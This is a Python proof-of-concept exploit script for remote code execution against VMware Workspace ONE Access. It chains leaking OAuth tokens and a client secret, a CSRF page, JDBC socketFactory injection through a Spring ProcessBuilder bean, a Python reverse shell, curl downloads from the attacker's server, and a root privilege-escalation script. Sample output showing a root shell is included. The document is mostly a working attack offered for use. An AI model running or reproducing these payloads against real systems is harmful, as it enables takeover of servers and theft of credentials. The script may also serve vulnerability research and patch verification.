#!/usr/bin/env python3
"""
Hekate - A VMWare Workspace ONE Access Remote Code Execution Exploit
Steven Seeley of Qihoo 360 Vulnerability Research Institute
Tekniq: PostgreSQL JDBC Driver socketFactory

# Details

Date: Tue Feb 22 13:37:00 CST 2022
Version: 21.08.0.1 (latest)
File: identity-manager-21.08.0.1-19010796_OVF10.ova
File SHA1: 69e9fb988522c92e98d2910cc106ba4348d61851

# Example

Attacking server-side:

```
researcher@mercury:~$ ./poc.py -t 192.168.184.165 -c 192.168.184.146:1234 -v server

   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\_,_/\__/\__/

A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute

(+) attacking target via the postgresql driver
(+) rogue http server listening on 0.0.0.0:8080
(+) leaked ota token:  a279518f-8eac-3399-8101-ee682c0f3904:Ak9iRF5J7Mi8XtNg2K6apWktXHot8B9i
(+) leaked client_secret: OGalIg14iBh6NSOoGMaNbQfLJPko0KUu
(+) triggering command: curl http://192.168.184.146:8080/bdr.py -o /tmp/a
(+) triggered bdr download...
(+) triggering command: curl http://192.168.184.146:8080/lpe.sh -o /tmp/b
(+) triggered lpe download...
(+) triggering command: chmod 755 /tmp/a
(+) triggering command: chmod 755 /tmp/b
(+) triggering command: python /tmp/a
(+) starting handler on port 1234
(+) connection from 192.168.184.165
(+) pop thy shell!
root [ ~ ]# id
id
uid=0(root) gid=0(root) groups=0(root),1000(vami),1004(sshaccess)
root [ ~ ]# uname -a
uname -a
Linux photon-machine 4.19.217-1.ph3 #1-photon SMP Thu Dec 2 02:29:27 UTC 2021 x86_64 GNU/Linux
root [ ~ ]#
```

Attacking client-side:

```
researcher@mercury:~$ ./poc.py -t 192.168.184.165 -c 192.168.184.146:1234 -v client

   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\_,_/\__/\__/

A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute

(+) attacking target via the postgresql driver
(+) rogue http server listening on 0.0.0.0:8080
(+) send the victim to: http://192.168.184.146:8080/pwn
(+) starting handler on port 1234
(+) triggering command: curl http://192.168.184.146:8080/bdr.py -o /tmp/a
(+) triggering command: curl http://192.168.184.146:8080/lpe.sh -o /tmp/b
(+) triggering command: chmod 755 /tmp/a
(+) triggering command: chmod 755 /tmp/b
(+) triggering command: python /tmp/a
(+) triggered bdr download...
(+) triggered lpe download...
(+) connection from 192.168.184.165
(+) pop thy shell!
root [ ~ ]# id
id
uid=0(root) gid=0(root) groups=0(root),1000(vami),1004(sshaccess)
root [ ~ ]# uname -a
uname -a
Linux photon-machine 4.19.217-1.ph3 #1-photon SMP Thu Dec 2 02:29:27 UTC 2021 x86_64 GNU/Linux
root [ ~ ]#
```

# References

- http://tttang.com/archive/1462/
"""

import socket
from sys import argv
from json import loads
from time import sleep
from struct import pack
from hashlib import sha256
from base64 import b64decode
from telnetlib import Telnet
from threading import Thread
from requests import get, post
from urllib.parse import urlparse
from colorama import Fore, Style, Back
from random import getrandbits, choice
from urllib3 import disable_warnings, exceptions
from argparse import ArgumentParser, RawTextHelpFormatter
from http.server import BaseHTTPRequestHandler, HTTPServer
disable_warnings(exceptions.InsecureRequestWarning)

# vuln 3
csrf_payload = """
<html>
  <head>
    <script language="javascript">
        function pwn(i){{
            var fd = new FormData()
            fd.append("jdbcUrl", "{j}" + i + "poc.xml");
            fd.append("dbUsername", "");
            fd.append("dbPassword", "");
            fetch('https://{t}/SAAS/API/1.0/REST/system/dbCheck', {{
                method: 'POST',
                body: fd,
                credentials: 'include'
            }});
        }}
        window.onload = function() {{
            for(var i = 0; i < 5; i++){{
                pwn(i);
            }}
        }}
    </script>
  </head>
</html>
"""

bdr_payload = """
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{h}", {p}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn(["/bin/bash","/tmp/b"]) # lpe
"""

# vuln 5
lpe_payload = """
#!/bin/bash
cd /tmp
sudo /usr/local/horizon/scripts/publishCaCert.hzn /opt/vmware/certproxy/bin/certproxyService.sh {d}
mkdir {d}
ln -s /opt/vmware/certproxy/bin/certproxyService.sh {d}/debugConfig.txt
sudo /usr/local/horizon/scripts/gatherConfig.hzn {d}
rm -rf {d}
chmod 755 /opt/vmware/certproxy/bin/certproxyService.sh
echo "mv /etc/ssl/certs/{d} /opt/vmware/certproxy/bin/certproxyService.sh" > /opt/vmware/certproxy/bin/certproxyService.sh
echo "chown root:root /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
echo "chmod 640 /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
echo "rm /tmp/a; rm /tmp/b; cd /root; python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'" >> /opt/vmware/certproxy/bin/certproxyService.sh
sudo /opt/vmware/certproxy/bin/certproxyService.sh
"""

bean = """
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                {cmd}
            </list>
        </constructor-arg>
    </bean>
</beans>
"""

class http_server(BaseHTTPRequestHandler):
    cmd_done = {0: False, 1: False, 2: False, 3: False, 4: False}
    cmd_c = 0
    def log_message(self, format, *args):
        return
    def _set_response(self, d):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Content-Length', len(d))
        self.end_headers()
    def do_GET(self):
        if self.path.endswith("poc.xml"):
            # this is a little awkward but it's very reliable
            if args.vector == "client":
                sleep(0.15)
                entry = http_server.cmd_c
            else:
                entry = int(self.path[1:2])
            # we run 5 commands against the server before we finish
            if entry == 5:
                 entry = 0
            cmd = cmd_entries[entry]  
            if not http_server.cmd_done[entry]:
                print(f"(+) {Fore.LIGHTRED_EX}triggering command:{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{cmd}{Style.RESET_ALL}")
                p = ""
                for c in cmd.split(" "):
                    p += f"<value>{c}</value>"
                http_server.cmd_done[entry] = True
                http_server.cmd_c += 1
                message = bean.format(cmd=p)
            else:
                message = ""
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        if self.path.endswith("pwn"):
            # tested against chrome 98.0.4758.102 (latest at the time)
            message = csrf_payload.format(j=jdbc_uri, t=hostname)
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        elif self.path.endswith("lpe.sh"):
            print(f"(+) {Fore.LIGHTRED_EX}triggered lpe download...{Style.RESET_ALL}")
            message = lpe_payload.format(d=gen_key()) 
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        elif self.path.endswith("bdr.py"):
            print(f"(+) {Fore.LIGHTRED_EX}triggered bdr download...{Style.RESET_ALL}")
            message = bdr_payload.format(h=rhost, p=rport)
            self._set_response(message)
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))

def gen_key():
    return str.encode(sha256(str(getrandbits(256)).encode('utf-8')).hexdigest())

def handler(lp):
    print(f"(+) starting handler on port {lp}")
    t = Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"(+) connection from {addr[0]}")
    t.sock = conn
    print(f"(+) {Fore.BLUE + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
    t.interact()

# vuln 2
def get_hostname(t):
    r = get("https://{}/SAAS/jersey/manager/api/branding".format(t), verify=False)
    assert r.headers['content-type'] == 'application/vnd.vmware.horizon.manager.branding+json;charset=UTF-8', "(-) unexpected content-type cannot leak hostname"
    return urlparse(r.json()['userPortal']['mfaIconDownload']).hostname

# vuln 1 
def get_jwt(t):
    oauth_client = choice(['Service__OAuth2Client', 'acs'])
    r = post(f"https://{t}/SAAS/API/1.0/REST/oauth2/generateActivationToken/{oauth_client}", verify=False)
    assert r.headers['content-type'] == "application/json;charset=UTF-8","(-) unexpected response from token generation"
    code = r.json()['activationToken']
    ota = loads(b64decode(code))['ota']
    print(f"(+) {Fore.LIGHTRED_EX}leaked ota token: {Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{ota}{Style.RESET_ALL}")
    r = post(f"https://{t}/SAAS/API/1.0/REST/oauth2/activate", data=code,verify=False)
    assert r.headers['content-type'] == "application/json;charset=UTF-8","(-) unexpected response from token activation"
    ci = r.json()['client_id']
    cs = r.json()['client_secret']
    print(f"(+) {Fore.LIGHTRED_EX}leaked client_secret:{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}{cs}{Style.RESET_ALL}")
    p = {
        "grant_type"    : "client_credentials",
        "client_id"     : ci,
        "client_secret" : cs
    }
    r = post(f"https://{t}/SAAS/auth/oauthtoken", data=p, verify=False)
    assert r.headers['content-type'] == "application/json;charset=UTF-8","(-) unexpected response from access token generation"
    return r.json()['access_token']

# vuln 4
def trigger_jdbc(t, jwt, uri):
    d = {
        "jdbcUrl": uri,
        "dbUsername":"",
        "dbPassword":""
    }
    h = { "cookie" : f"HZN={jwt}" }
    post(f"https://{t}/SAAS/API/1.0/REST/system/dbCheck", headers=h, data=d, verify=False)

def banner():
    return f"""{Fore.RED + Style.BRIGHT}
   __ __    __        __
  / // /__ / /_____ _/ /____
 / _  / -_)  '_/ _ `/ __/ -_)
/_//_/\__/_/\_\\\_,_/\__/\__/

{Style.RESET_ALL}A VMWare Workspace ONE Access RCE Exploit
By Steven Seeley (mr_me) of Qihoo 360 Vulnerability Research Institute
"""

def get_args(prog):
    helpm = f"Examples: \r\n{prog} -t 192.168.184.165 -c 192.168.184.146:1234 -v client"
    helpm += f"\r\n{prog} -t 192.168.184.165 -c 192.168.184.146:1234 -v server"
    parser = ArgumentParser(epilog=helpm, formatter_class=RawTextHelpFormatter)
    v = ["client", "server"]
    parser.add_argument('-t', '--target', dest='target', action='store', type=str, required=True,
    help='The target ip', metavar='[ip]')
    parser.add_argument('-c', '--connectback', dest='connectback', action='store', type=str, required=True,
    help='The connectback/attacking ip or hostname and port', metavar='[ip:port]')
    parser.add_argument('-v', '--vector', dest='vector', action='store', type=str, required=True,
    default="client", choices=v, help='The vector for exploitation. Either '+' or '.join(v), metavar='[vector]')
    return parser.parse_args()

def validip(ip):
    return ip.count('.') == 3 and all(0<=int(num)<256 for num in ip.rstrip().split('.'))

if __name__ == "__main__":
    print(banner())
    args       = get_args(argv[0])
    rport      = 1337
    rhost      = args.connectback
    target     = args.target
    http_port  = 8080
    mysql_port = 3306
    assert validip(target), "(-) you need to provide a valid ip address as the target"
    if ":" in args.connectback:
        rhost = args.connectback.split(":")[0]
        assert args.connectback.split(":")[1].isnumeric(),"(-) port must be a valid integer"
        rport = int(args.connectback.split(":")[1])
    cmd_entries = {
        0:f"curl http://{rhost}:{http_port}/bdr.py -o /tmp/a",
        1:f"curl http://{rhost}:{http_port}/lpe.sh -o /tmp/b",
        2:"chmod 755 /tmp/a",
        3:"chmod 755 /tmp/b",
        4:"python /tmp/a"
    }
    jdbc_uri  = "jdbc:postgresql://localhost:1337/saas?"
    jdbc_uri += f"socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://{rhost}:{http_port}/"
    # connectback http server for the csrf exploit and PostgreSQL JDBC driver exploitation
    server = HTTPServer(('0.0.0.0', http_port), http_server)
    handlerthr = Thread(target=server.serve_forever, args=[])
    handlerthr.daemon = True
    handlerthr.start()
    print(f"(+) attacking target via the postgresql driver")
    print(f"(+) rogue http server listening on 0.0.0.0:{http_port}")
    if args.vector == "client":
        hostname = get_hostname(target)
        print(f"(+) send the victim to: {Fore.CYAN + Back.MAGENTA + Style.BRIGHT}http://{rhost}:{http_port}/pwn{Style.RESET_ALL}")
    else:
        jwt = get_jwt(target)
        for i in range(0, 5):
            trigger_jdbc(target, jwt, jdbc_uri + f"{i}poc.xml")
    handlerthr = Thread(target=handler, args=[rport])
    handlerthr.start()
